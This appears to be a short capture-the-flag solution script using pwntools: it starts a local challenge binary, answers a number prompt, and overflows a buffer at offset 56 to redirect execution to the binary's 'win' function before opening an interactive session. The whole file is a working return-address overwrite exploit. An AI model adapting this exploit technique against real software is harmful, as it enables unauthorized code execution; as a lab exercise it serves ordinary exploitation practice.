from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
host, port = '127.0.0.1', 5004

io = process(exe)
# io = remote(host, port)

offset = 56
payload = flat({
    offset: [
        elf.sym['win']
    ]
})

io.sendlineafter(b'number: ', b'103')
io.sendlineafter(b'payload: ', payload)
io.interactive()